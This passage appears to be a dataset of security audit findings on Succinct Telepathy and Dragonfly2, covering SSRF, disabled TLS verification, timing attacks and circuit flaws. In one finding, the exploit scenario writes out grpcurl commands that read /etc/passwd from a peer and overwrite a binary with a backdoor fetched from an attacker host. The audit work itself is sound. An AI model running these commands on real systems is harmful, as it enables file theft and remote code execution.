properly encoded. While we did not identify any way to convert improperly encoded proof data into a proof forgery, it is simple to give an example of an out-of-bounds read that could possibly lead in other contexts to unexpected behavior. In gure 11.2, the result of items[0].toBytes() contains many bytes read from memory beyond the bounds allocated in the initial byte string. RLPReader.RLPItem memory item = RLPReader.toRlpItem( '\\xc3\\xd0' ); RLPReader.RLPItem[] memory items = item.toList(); assert(items[ 0 ].toBytes().length == 16 ); Figure 11.2: Out-of-of-bounds read due to invalid RLP encoding In this example, RLPReader.toRLPItem should revert because the encoded length of three bytes is longer than the payload length of the string; similarly, the call to toList() should fail because the nested RLPItem encodes a length of 16, again more than the underlying buer. To prevent such ill-constructed nested RLPItem s, the internal numItems function should revert if currPtr is not exactly equal to endPtr at the end of the loop shown in gure 11.3. // @return number of payload items inside an encoded list. function numItems (RLPItem memory item) private pure returns ( uint256 ) { if (item.len == 0 ) return 0 ; uint256 count = 0 ; uint256 currPtr = item.memPtr + _payloadOffset(item.memPtr); uint256 endPtr = item.memPtr + item.len; while (currPtr < endPtr) { currPtr = currPtr + _itemLength(currPtr); // skip over an item count++; } return count; } Figure 11.3: Solidity-RLP/contracts/RLPReader.sol#256269 Recommendations Short term, add a check in RLPReader.toRLPItem that validates that the length of the argument exactly matches the expected length of prex + payload based on the encoded prex. Similarly, add a check in RLPReader.numItems , checking that the sum of the encoded lengths of sub-objects matches the total length of the RLP list. Long term, treat any length values or pointers in untrusted data as potentially malicious and carefully check that they are within the expected bounds.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "12. TargetAMB _executeMessage lacks contract existence checks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf", "body": "When relaying messages on the target chain, the TargetAMB records the success or failure of the external contract call so that o-chain clients can track the success of their messages. However, if the recipient of the call is an externally owned-account or is otherwise empty, the handleTelepathy call will appear to have succeeded when it was not processed by any recipient. bytes memory recieveCall = abi.encodeWithSelector( ITelepathyHandler.handleTelepathy.selector, message.sourceChainId, message.senderAddress, message.data ); address recipient = TypeCasts.bytes32ToAddress(message.recipientAddress); (status,) = recipient.call(recieveCall); if (status) { messageStatus[messageRoot] = MessageStatus.EXECUTION_SUCCEEDED; } else { messageStatus[messageRoot] = MessageStatus.EXECUTION_FAILED; } Figure 12.1: telepathy/contracts/src/amb/TargetAMB.sol#150164 Exploit Scenario A user accidentally sends a transaction to the wrong address or an address that does not exist on the target chain. The UI displays the transaction as successful, possibly confusing the user further. Recommendations Short term, change the handleTelepathy interface to expect a return value and check that the return value is some magic constant, such as the four-byte ABI selector. See OpenZeppelins safeTransferFrom / IERC721Reciever pattern for an example. Long term, ensure that all low-level calls behave as expected when handling externally owned accounts.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "13. LightClient is unable to verify some block headers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf", "body": "The LightClient contract expects beacon block headers produced in a period prior to the period in which they are nalized to be signed by the wrong sync committee; those blocks will not be validated by the LightClient , and AMB transactions in these blocks may be delayed. The Telepathy light client tracks only block headers that are nalized, as dened by the ETH2.0 Casper nality mechanism. Newly proposed, unnalized beacon blocks contain a finalized_checkpoint eld with the most recently nalized block hash. The Step circuit currently exports only the slot number of this nested, nalized block as a public input. The LightClient contract uses this slot number to determine which sync committee it expects to sign the update. However, the correct slot number for this use is in fact that of the wrapping, unnalized block. In some cases, such as near the edge of a sync committee period or during periods of delayed nalization, the two slots may not belong to the same sync committee period. In this case, the signature will fail to verify, and the LightClient will become unable to validate the block header. Exploit Scenario A user sends an AMB message using the SourceAMB.sendViaLog function. The beacon block in which this execution block is included is late within a sync committee period and is not nalized on the beacon chain until the next period. The new sync committee signs the block, but this signature is rejected by the light client because it expects a signature from the old committee. Because this header cannot be nalized in the light client, the TargetAMB cannot relay the message until some future block in the new sync committee period is nalized in the light client, causing delivery delays. Recommendations Short term, Include attestedSlot in the public input commitment to the Step circuit. This can be achieved at no extra cost by packing the eight-byte attestedSlot value alongside the eight-byte finalizedSlot value, which currently is padded to 32 bytes. Long term, add additional unit and end-to-end tests to focus on cases where blocks are near the edges of epochs and sync committee periods. Further, reduce gas usage and circuit complexity by packing all public inputs to the step function into a single byte array that is hashed in one pass, rather than chaining successive calls to SHA-256, which reduces the eective rate by half and incurs overhead due to the additional external precompile calls.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "14. OptSimpleSWU2 Y-coordinate output is underconstrained ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-02-succinct-securityreview.pdf", "body": "The OptSimpleSWU2 circuit does not check that its Y-coordinate output is a properly formatted BigInt. This violates the canonicity assumptions of the Fp2Sgn0 circuit and other downstream components, possibly leading to unexpected nondeterminism in the sign of the output of MapToG2 . Incorrect results from MapToG2 would cause the circuit to verify the provided signature against a message dierent from that in the public input. While this does not allow malicious provers to forge signatures on arbitrary messages, this additional degree of freedom in witness generation could interact negatively with future changes to the codebase or instantiations of this circuit. var Y[2][50]; ... component Y_sq = Fp2Multiply(n, k, p); // Y^ 2 == g(X) for ( var i= 0 ; i< 2 ; i++) for ( var idx= 0 ; idx<k; idx++){ out [1][i][idx] <-- Y[i][idx]; Y_sq.a[i][idx] <== out [1][i][idx]; Y_sq.b[i][idx] <== out [1][i][idx]; } for ( var i= 0 ; i< 2 ; i++) for ( var idx= 0 ; idx<k; idx++){ Y_sq. out [i][idx] === isSquare * (gX0. out [i][idx] - gX1. out [i][idx]) + gX1. out [i][idx]; } // sgn0(Y) == sgn0(t) component sgn_Y = Fp2Sgn0(n, k, p); for ( var i= 0 ; i< 2 ; i++) for ( var idx= 0 ; idx<k; idx++) sgn_Y. in [i][idx] <== out [1][i][idx]; sgn_Y. out === sgn_in. out ; Figure 14.1: telepathy/circuits/circuits/pairing/bls12_381_hash_to_G2.circom#199226 A malicious prover can generate a witness where that Y-coordinate is not in its canonical representation. OptSimpleSWU2 calls Fp2Sgn0 , which in turn calls FpSgn0 . Although FpSgn0 checks that its input is less than p using BigLessThan , that is not sucient to guarantee that its input is canonical. BigLessThan allows limbs of its inputs to be greater than or equal to 2 n , so long as the dierence a[i]-b[i] is in . Violating FpSgn0 s   ) , 2 [ 2 assumption that the limbs are all in casesfor example, if FpSgn0 s output is incorrect, MapToG2 could return a point with an incorrect sign. could lead to unexpected behavior in some  ) [ 0 , 2 template FpSgn0(n, k, p){ signal input in [k]; signal output out ; // constrain in < p component lt = BigLessThan(n, k); for ( var i= 0 ; i<k; i++){ lt.a[i] <== in [i]; lt.b[i] <== p[i]; } lt. out === 1 ; // note we only need in [0] ! var r = in [0] % 2 ; var q = ( in [0] - r) / 2 ; out <-- r; signal div; div <-- q; out * ( 1 - out ) === 0 ; in [0] === 2 * div + out ; } Figure 14.2: telepathy/circuits/circuits/pairing/fp.circom#229249 Exploit Scenario A malicious prover can use a malformed BigInt to change the computed sign of the out signal of OptSimpleSWU2 at proving time. That changed sign will cause the rest of the circuit to accept certain incorrect values in place of H(m) when checking the BLS signature. The prover could then successfully generate a proof with certain malformed signatures. Recommendations Short term, use Num2Bits to constrain the Y-coordinate output of OptSimpleSWU2 to be a well-formed BigInt . Long term, clearly document and validate the representation of the output values in templates such as OptSimpleSWU2 .", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "1. Authentication is not enabled for some Managers endpoints ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The /api/v1/jobs and /preheats endpoints in Manager web UI are accessible without authentication. Any user with network access to the Manager can create, delete, and modify jobs, and create preheat jobs. job := apiv1.Group( \"/jobs\" ) Figure 1.1: The /api/v1/jobs endpoint denition ( Dragonfly2/manager/router/router.go#191 ) // Compatible with the V1 preheat. pv1 := r.Group( \"/preheats\" ) r.GET( \"_ping\" , h.GetHealth) pv1.POST( \"\" , h.CreateV1Preheat) pv1.GET( \":id\" , h.GetV1Preheat) Figure 1.2: The /preheats endpoint denition ( Dragonfly2/manager/router/router.go#206210 ) Exploit Scenario An unauthenticated adversary with network access to a Manager web UI uses /api/v1/jobs endpoint to create hundreds of useless jobs. The Manager is in a denial-of-service state, and stops accepting requests from valid administrators. Recommendations Short term, add authentication and authorization to the /api/v1/jobs and /preheats endpoints. Long term, rewrite the Manager web API so that all endpoints are authenticated and authorized by default, and only selected endpoints explicitly disable these security controls. Alternatively, rewrite the API into public and private parts using groups, as demonstrated in this comment . The proposed design will prevent developers from forgetting to protect some endpoints.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "2. Server-side request forgery vulnerabilities ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "There are multiple server-side request forgery (SSRF) vulnerabilities in the DragonFly2 system. The vulnerabilities enable users to force DragonFly2s components to make requests to internal services, which otherwise are not accessible to the users. One SSRF attack vector is exposed by the Managers API. The API allows users to create jobs. When creating a Preheat type of a job, users provide a URL that the Manager connects to (see gures 2.12.3). The URL is weakly validated, and so users can trick the Manager into sending HTTP requests to services that are in the Managers local network. func (p *preheat) CreatePreheat(ctx context.Context, schedulers []models.Scheduler, json types.PreheatArgs) (*internaljob.GroupJobState, error ) { [skipped] url := json.URL [skipped] // Generate download files var files []internaljob.PreheatRequest switch PreheatType(json.Type) { case PreheatImageType: // Parse image manifest url skipped , err := parseAccessURL(url) [skipped] nethttp.MapToHeader(rawheader), image) files, err = p.getLayers(ctx, url, tag, filter, [skipped] case PreheatFileType: [skipped] } Figure 2.1: A method handling Preheat job creation requests ( Dragonfly2/manager/job/preheat.go#89132 ) func (p *preheat) getLayers (ctx context.Context, url, tag, filter string , header http.Header, image *preheatImage) ([]internaljob.PreheatRequest, error ) { ctx, span := tracer.Start(ctx, config.SpanGetLayers, trace.WithSpanKind(trace.SpanKindProducer)) defer span.End() resp, err := p.getManifests(ctx, url, header) Figure 2.2: A method called by the CreatePreheat function ( Dragonfly2/manager/job/preheat.go#176180 ) func (p *preheat) getManifests(ctx context.Context, url string , header http.Header) (*http.Response, error ) { req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil ) if err != nil { return nil , err } req.Header = header req.Header.Add(headers.Accept, schema2.MediaTypeManifest) client := &http.Client{ Timeout: defaultHTTPRequesttimeout, Transport: &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true }, }, } resp, err := client.Do(req) if err != nil { return nil , err } return resp, nil } Figure 2.3: A method called by the getLayers function ( Dragonfly2/manager/job/preheat.go#211233 ) A second attack vector is in peer-to-peer communication. A peer can ask another peer to make a request to an arbitrary URL by triggering the pieceManager.DownloadSource method (gure 2.4), which calls the httpSourceClient.GetMetadata method, which performs the request. func (pm *pieceManager) DownloadSource(ctx context.Context, pt Task, peerTaskRequest *schedulerv1.PeerTaskRequest, parsedRange *nethttp.Range) error { Figure 2.4: Signature of the DownloadSource function ( Dragonfly2/client/daemon/peer/piece_manager.go#301 ) Another attack vector is due to the fact that HTTP clients used by the DragonFly2s components do not disable support for HTTP redirects. This conguration means that an HTTP request sent to a malicious server may be redirected by the server to a components internal service. Exploit Scenario An unauthenticated user with access to the Manager API registers himself with a guest account. The user creates a preheat jobhe is allowed to do so, because of a bug described in TOB-DF2-1 with a URL pointing to an internal service. The Manager makes the request to the service on behalf of the malicious user. Recommendations Short term, investigate all potential SSRF attack vectors in the DragonFly2 system and mitigate risks by either disallowing requests to internal networks or creating an allowlist conguration that would limit networks that can be requested. Disable automatic HTTP redirects in HTTP clients. Alternatively, inform users about the SSRF attack vectors and provide them with instructions on how to mitigate this attack on the network level (e.g., by conguring rewalls appropriately). Long term, ensure that applications cannot be tricked to issue requests to arbitrary locations provided by its users. Consider implementing a single, centralized class responsible for validating the destinations of requests. This will increase code maturity with respect to HTTP request handling.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "3. Manager makes requests to external endpoints with disabled TLS authentication ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The Manager disables TLS certicate verication in two HTTP clients (gures 3.1 and 3.2). The clients are not congurable, so users have no way to re-enable the verication. func getAuthToken(ctx context.Context, header http.Header) ( string , error ) { [skipped] client := &http.Client{ Timeout: defaultHTTPRequesttimeout, Transport: &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true }, }, } [skipped] } Figure 3.1: getAuthToken function with disabled TLS certicate verication ( Dragonfly2/manager/job/preheat.go#261301 ) func (p *preheat) getManifests(ctx context.Context, url string , header http.Header) (*http.Response, error ) { [skipped] client := &http.Client{ Timeout: defaultHTTPRequesttimeout, Transport: &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true }, }, } [skipped] } Figure 3.2: getManifests function with disabled TLS certicate verication ( Dragonfly2/manager/job/preheat.go#211233 ) Exploit Scenario A Manager processes dozens of preheat jobs. An adversary performs a network-level Man-in-the-Middle attack, providing invalid data to the Manager. The Manager preheats with the wrong data, which later causes a denial of service and le integrity problems. Recommendations Short term, make the TLS certicate verication congurable in the getManifests and getAuthToken methods. Preferably, enable the verication by default. Long term, enumerate all HTTP, gRPC, and possibly other clients that use TLS and document their congurable and non-congurable (hard-coded) settings. Ensure that all security-relevant settings are congurable or set to secure defaults. Keep the list up to date with the code. 4. Incorrect handling of a task structures usedTra\u0000c eld Severity: Low Diculty: Medium Type: Data Validation Finding ID: TOB-DF2-4 Target: Dragonfly2/client/daemon/peer/piece_manager.go", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "5. Directories created via os.MkdirAll are not checked for permissions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "DragonFly2 uses the os.MkdirAll function to create certain directory paths with specic access permissions. This function does not perform any permission checks when a given directory path already exists. This allows a local attacker to create a directory to be used later by DragonFly2 with broad permissions before DragonFly2 does so, potentially allowing the attacker to tamper with the les. Exploit Scenario Eve has unprivileged access to the machine where Alice uses DragonFly2. Eve watches the commands executed by Alice and introduces new directories/paths with 0777 permissions before DragonFly2 does so. Eve can then delete and forge les in that directory to change the results of further commands executed by Alice. Recommendations Short term, when using utilities such as os.MkdirAll , os.WriteFile , or outil.WriteFile , check all directories in the path and validate their owners and permissions before performing operations on them. This will help avoid situations where sensitive information is written to a pre-existing attacker-controlled path. Alternatively, explicitly call the chown and chmod methods on newly created les and permissions. We recommend making a wrapper method around le and directory creation functions that would handle pre-existence checks or would chain the previously mentioned methods. Long term, enumerate les and directories for their expected permissions overall, and build validation to ensure appropriate permissions are applied before creation and upon use. Ideally, this validation should be centrally dened and used throughout the entire application.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "6. Slicing operations with hard-coded indexes and without explicit length validation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "In the buildDownloadPieceHTTPRequest and DownloadTinyFile methods (gures 6.1 and 6.2), there are array slicing operations with hard-coded indexes. If the arrays are smaller than the indexes, the code panics. This ndings severity is informational, as we were not able to trigger the panic with a request from an external actor. func (p *pieceDownloader) buildDownloadPieceHTTPRequest(ctx context.Context, d *DownloadPieceRequest) *http.Request { // FIXME switch to https when tls enabled targetURL := url.URL{ Scheme: Host: Path: RawQuery: fmt.Sprintf( \"peerId=%s\" , d.DstPid), p.scheme, d.DstAddr, fmt.Sprintf( \"download/%s/%s\" , d.TaskID[: 3 ], d.TaskID), } Figure 6.1: If d.TaskID length is less than 3, the code panics ( Dragonfly2/client/daemon/peer/piece_downloader.go#198205 ) func (p *Peer) DownloadTinyFile() ([] byte , error ) { ctx, cancel := context.WithTimeout(context.Background(), downloadTinyFileContextTimeout) defer cancel() // Download url: http://${host}:${port}/download/${taskIndex}/${taskID}?peerId=${peerID} targetURL := url.URL{ Scheme: Host: Path: RawQuery: fmt.Sprintf( \"peerId=%s\" , p.ID), \"http\" , fmt.Sprintf( \"%s:%d\" , p.Host.IP, p.Host.DownloadPort), fmt.Sprintf( \"download/%s/%s\" , p.Task.ID[: 3 ], p.Task.ID), } Figure 6.2: If p.Task.ID length is less than 3, the code panics ( Dragonfly2/scheduler/resource/peer.go#436446 ) Recommendations Short term, explicitly validate lengths of arrays before performing slicing operations with hard-coded indexes. If the arrays are known to always be of sucient size, add a comment in code to indicate this, so that further reviewers of the code will not have to triage this false positive. Long term, add fuzz testing to the codebase. This type of testing helps to identify missing data validation and inputs triggering panics.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Files are closed without error check ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "Several methods in the DragonFly2 codebase defer le close operations after writing to a le. This may introduce undened behavior, as the les content may not be ushed to disk until the le has been closed. Errors arising from the inability to ush content to disk while closing will not be caught, and the application may assume that content was written to disk successfully. See the example in gure 7.1. file, err := os.OpenFile(t.DataFilePath, os.O_RDWR, defaultFileMode) if err != nil { return 0 , err } defer file.Close() Figure 7.1: Part of the localTaskStore.WritePiece method ( Dragonfly2/client/daemon/storage/local_storage.go#124128 ) The bug occurs in multiple locations throughout the codebase. Exploit Scenario The server on which the DragonFly2 application runs has a disk that periodically fails to ush content due to a hardware failure. As a result, certain methods in the codebase sometimes fail to write content to disk. This causes undened behavior. Recommendations Short term, consider closing les explicitly at the end of functions and checking for errors. Alternatively, defer a wrapper function to close the le and check for errors if applicable. Long term, test the DragonFly2 system with failure injection technique. This technique works by randomly failing system-level calls (like the one responsible for writing a le to a disk) and checking if the application under test correctly handles the error. References  \"Don't defer Close() on writable les\" blog post  Security assessment techniques for Go projects, Fault injection chapter", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "8. Timing attacks against Proxys basic authentication are possible ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The access control mechanism for the Proxy feature uses simple string comparisons and is therefore vulnerable to timing attacks. An attacker may try to guess the password one character at a time by sending all possible characters to a vulnerable mechanism and measuring the comparison instructions execution times. The vulnerability is shown in gure 8.1, where both the username and password are compared with a short-circuiting equality operation. if user != proxy.basicAuth.Username || pass != proxy.basicAuth.Password { Figure 8.1: Part of the ServeHTTP method with code line vulnerable to the timing attack ( Dragonfly2/client/daemon/proxy/proxy.go#316 ) It is currently undetermined what an attacker may be able to do with access to the proxy password. Recommendations Short term, replace the simple string comparisons used in the ServeHTTP method with constant-time comparisons. This will prevent the possibility of timing the comparison operation to leak passwords. Long term, use static analysis to detect code vulnerable to simple timing attacks. For example, use the CodeQLs go/timing-attack query . References   Timeless Timing Attacks : this presentation explains how timing attacks can be made more ecient. Go crypto/subtle ConstantTimeCompare method : this method implements a constant-time comparison.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "9. Possible panics due to nil pointer dereference when using variables created alongside an error ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "We found two instances in the DragonFly codebase where the rst return value of a function is dereferenced even when the function returns an error (gures 9.1 and 9.2). This can result in a nil dereference, and cause code to panic . The codebase may contain additional instances of the bug. request, err := source.NewRequestWithContext(ctx, parentReq.Url, parentReq.UrlMeta.Header) if err != nil { log.Errorf( \"generate url [%v] request error: %v\" , request.URL, err) span.RecordError(err) return err } Figure 9.1: If there is an error, the request.URL variable is used even if the request is nil ( Dragonfly2/client/daemon/rpcserver/rpcserver.go#621626 ) prefetch, err := ptm.getPeerTaskConductor(context.Background(), taskID, req, limit, nil , nil , desiredLocation, false ) if err != nil { logger.Errorf( \"prefetch peer task %s/%s error: %s\" , prefetch.taskID, prefetch.peerID, err) return nil } Figure 9.2: prefetch may be nil when there is an error, and trying to get prefetch.taskID can cause a nil dereference panic ( Dragonfly2/client/daemon/peer/peertask_manager.go#294298 ) Exploit Scenario Eve is a malicious actor operating a peer machine. She sends a dfdaemonv1.DownRequest request to her peer Alice. Alices machine receives the request, resolves a nil variable in the server.Download method, and panics. Recommendations Short term, change the error message code to avoid making incorrect dereferences. Long term, review codebase against this type of issue. Systematically use static analysis to detect this type of vulnerability. For example, use  Semgrep invalid-usage-of-modified-variable rule .", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "10. TrimLeft is used instead of TrimPrex ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The strings.TrimLeft function is used at multiple points in the Dragony codebase to remove a prex from a string. This function has unexpected behavior; its second argument is an unordered set of characters to remove, rather than a prex to remove. The strings.TrimPrefix function should be used instead. The issues that were found are presented in gures 10.14. However, the codebase may contain additional issues of this type. urlMeta.Range = strings.TrimLeft(r, http.RangePrefix) Figure 10.1: Dragonfly2/scheduler/job/job.go#175 rg = strings.TrimLeft(r, \"bytes=\" ) Figure 10.2: Dragonfly2/client/dfget/dfget.go#226 urlMeta.Range = strings.TrimLeft(rangeHeader, \"bytes=\" ) Figure 10.3: Dragonfly2/client/daemon/objectstorage/objectstorage.go#288 meta.Range = strings.TrimLeft(rangeHeader, \"bytes=\" ) Figure 10.4: Dragonfly2/client/daemon/transport/transport.go#264 Figure 10.5 shows an example of the dierence in behavior between strings.TrimLeft and strings.TrimPrefix : strings.TrimLeft( \"bytes=bbef02\" , \"bytes=\" ) == \"f02\" strings.TrimPrefix( \"bytes=bbef02\" , \"bytes=\" ) == \"bbef02\" Figure 10.5: dierence in behavior between strings.TrimLeft and strings.TrimPrefix The nding is informational because we were unable to determine an exploitable attack scenario based on the vulnerability. Recommendations Short term, replace incorrect calls to string.TrimLeft method with calls to string.TrimPrefix . Long term, test DragonFly2 functionalities against invalid and malformed data, such HTTP headers that do not adhere to the HTTP specication.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "11. Vertex.DeleteInEdges and Vertex.DeleteOutEdges functions are not thread safe ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The Vertex.DeleteInEdges and Vertex.DeleteOutEdges functions are not thread safe, and may cause inconsistent states if they are called at the same time as other functions. Figure 11.1 shows implementation of the Vertex.DeleteInEdges function. // DeleteInEdges deletes inedges of vertex. func (v *Vertex[T]) DeleteInEdges() { for _, parent := range v.Parents.Values() { parent.Children.Delete(v) } v.Parents = set.NewSafeSet[*Vertex[T]]() } Figure 11.1: The Vertex.DeleteInEdges method ( Dragonfly2/pkg/graph/dag/vertex.go#5461 ) The for loop iterates through the vertexs parents, deleting the corresponding entry in their Children sets. After the for loop, the vertexs Parents set is assigned to be the empty set. However, if a parent is added to the vertex (on another thread) in between these two operations, the state will be inconsistent. The parent will have the vertex in its Children set, but the vertex will not have the parent in its Parents set. The same problem happens in Vertex.DeleteOutEdges method, since its code is essentially the same, but with Parents swapped with Children in all occurrences. It is undetermined what exploitable problems this bug can cause. Recommendations Short term, give Vertex.DeleteInEdges and Vertex.DeleteOutEdges methods access to the DAG s mutex, and use mu.Lock to prevent other threads from accessing the DAG while Vertex.DeleteInEdges or Vertex.DeleteOutEdges is in progress. Long term, consider writing randomized stress tests for these sorts of bugs; perform many writes concurrently, and see if any data races or invalid states occur. References  Documentation on golangs data race detector", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "12. Arbitrary le read and write on a peer machine ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "A peer exposes the gRPC API and HTTP API for consumption by other peers. These APIs allow peers to send requests that force the recipient peer to create les in arbitrary le system locations, and to read arbitrary les. This allows peers to steal other peers secret data and to gain remote code execution (RCE) capabilities on the peers machine. The gRPC API has, among others, the ImportTask and ExportTask endpoints (gure 12.1). The rst endpoint copies the le specied in the path argument (gures 12.2 and 12.3) to a directory pointed by the dataDir conguration variable (e.g., /var/lib/dragonfly ). // Daemon Client RPC Service service Daemon{ [skipped] // Import the given file into P2P cache system rpc ImportTask(ImportTaskRequest) returns (google.protobuf.Empty); // Export or download file from P2P cache system rpc ExportTask(ExportTaskRequest) returns (google.protobuf.Empty); [skipped] } Figure 12.1: Denition of the gRPC API exposed by a peer ( api/pkg/apis/dfdaemon/v1/dfdaemon.proto#113131 ) message ImportTaskRequest { // Download url. string url = 1 [(validate.rules). string .min_len = 1 ]; // URL meta info. common.UrlMeta url_meta = 2 ; // File to be imported. string path = 3 [(validate.rules). string .min_len = 1 ]; // Task type. common.TaskType type = 4 ; } Figure 12.2: Arguments for the ImportTask endpoint ( api/pkg/apis/dfdaemon/v1/dfdaemon.proto#7685 ) file, err := os.OpenFile(t.DataFilePath, os.O_RDWR, defaultFileMode) if err != nil { return 0 , err } defer file.Close() if _, err = file.Seek(req.Range.Start, io.SeekStart); err != nil { return 0 , err } n, err := io.Copy(file, io.LimitReader(req.Reader, req.Range.Length)) Figure 12.3: Part of the WritePiece method (called by the handler of the ImportTask endpoint) that copies the content of a le ( Dragonfly2/client/daemon/storage/local_storage.go#124133 ) The second endpoint moves the previously copied le to a location provided by the output argument (gures 12.4 and 12.5). message ExportTaskRequest { // Download url. string url = 1 [(validate.rules). string .min_len = 1 ]; // Output path of downloaded file. string output = 2 [(validate.rules). string .min_len = 1 ]; [skipped] } Figure 12.4: Arguments for the ExportTask endpoint ( api/pkg/apis/dfdaemon/v1/dfdaemon.proto#87104 ) dstFile, err := os.OpenFile(req.Destination, os.O_CREATE|os.O_RDWR|os.O_TRUNC, defaultFileMode) if err != nil { t.Errorf( \"open tasks destination file error: %s\" , err) return err } defer dstFile.Close() // copy_file_range is valid in linux // https://go-review.googlesource.com/c/go/+/229101/ n, err := io.Copy(dstFile, file) Figure 12.5: Part of the Store method (called by the handler of the ExportTask endpoint) that copies the content of a le; req.Destination equals the output argument ( Dragonfly2/client/daemon/storage/local_storage.go#396404 ) The HTTP API, called Upload Manager, exposes the /download/:task_prefix/:task_id endpoint. This endpoint can be used to read a le that was previously imported with the relevant gRPC API call. Exploit Scenario Alice (a peer in a DragonFly2 system) wants to steal the /etc/passwd le from Bob (another peer). Alice uses the command shown in gure 12.6 to make Bob import the le to a dataDir directory. grpcurl -plaintext -format json -d \\ '{\"url\":\"http://example.com\", \"path\":\"/etc/passwd\", \"urlMeta\":{\"digest\": \"md5:aaaff\", \"tag\":\"tob\"}}'$ BOB_IP:65000 dfdaemon.Daemon.ImportTask Figure 12.6: Command to steal /etc/passwd Next, she sends an HTTP request, similar to the one in gure 12.7, to Bob. Bob returns the content of his /etc/passwd le. GET /download/<prefix>/<sha256>?peerId=172.17.0.1-1-<tag> HTTP / 1.1 Host: $BOB_IP:55002 Range: bytes=0-100 Figure 12.7: Bobs response, revealing /etc/passwd contents Later, Alice uploads a malicious backdoor executable to the peer-to-peer network. Once Bob has downloaded (e.g., via the exportFromPeers method) and cached the backdoor le, Alice sends a request like the one shown in gure 12.8 to overwrite the /opt/dragonfly/bin/dfget binary with the backdoor. grpcurl -plaintext -format json -d \\ '{\"url\":\"http://alice.com/backdoor\", \"output\":\"/opt/dragonfly/bin/dfget\", \"urlMeta\":{\"digest\": \"md5:aaaff\", \"tag\":\"tob\"}}' $BOB_IP:65000 dfdaemon.Daemon.ExportTask Figure 12.8: Command to overwrite dfget binary After some time Bob restarts the dfget daemon, which executes Alices backdoor on his machine. Recommendations Short term, sandbox the DragonFly2 daemon, so that it can access only les within a certain directory. Mitigate path traversal attacks. Ensure that APIs exposed by peers cannot be used by malicious actors to gain arbitrary le read or write, code execution, HTTP request forgery, and other unintended capabilities.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "13. Manager generates mTLS certicates for arbitrary IP addresses ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "A peer can obtain a valid TLS certicate for arbitrary IP addresses, eectively rendering the mTLS authentication useless. The issue is that the Managers Certificate gRPC service does not validate if the requested IP addresses belong to the peer requesting the certicatethat is, if the peer connects from the same IP address as the one provided in the certicate request. Please note that the issue is known to developers and marked with TODO comments, as shown in gure 13.1. if addr, ok := p.Addr.(*net.TCPAddr); ok { ip = addr.IP.String() } else { ip, _, err = net.SplitHostPort(p.Addr.String()) if err != nil { return nil , err } } // Parse csr. [skipped] // Check csr signature. // TODO check csr common name and so on. if err = csr.CheckSignature(); err != nil { return nil , err } [skipped] // TODO only valid for peer ip // BTW we need support both of ipv4 and ipv6. ips := csr.IPAddresses if len (ips) == 0 { // Add default connected ip. ips = []net.IP{net.ParseIP(ip)} } Figure 13.1: The Managers Certificate gRPC handler for the IssueCertificate endpoint ( Dragonfly2/manager/rpcserver/security_server_v1.go#6598 ) Recommendations Short term, implement the missing IP addresses validation in the IssueCertificate endpoint of the Managers Certificate gRPC service. Ensure that a peer cannot obtain a certicate with an ID that does not belong to the peer. Long term, research common security problems in PKI infrastructures and ensure that DragonFly2s PKI does not have them. Ensure that if a peer IP address changes, the certicates issued for that IP are revoked.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "14. gRPC requests are weakly validated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-dragonfly2-securityreview.pdf", "body": "The gRPC requests are weakly validated, and some requests elds are not validated at all. For example, the ImportTaskRequest s url_meta eld is not validated and may be missing from a request (see gure 14.1). Sending requests to the ImportTask endpoint (as shown in gure 14.2) triggers the code shown in gure 14.3. The highlighted call to the logger accesses the req.UrlMeta.Tag variable, causing a nil dereference panic (because the req.UrlMeta variable is nil ). message ImportTaskRequest { // Download url. string url = 1 [(validate.rules). string .min_len = 1 ]; // 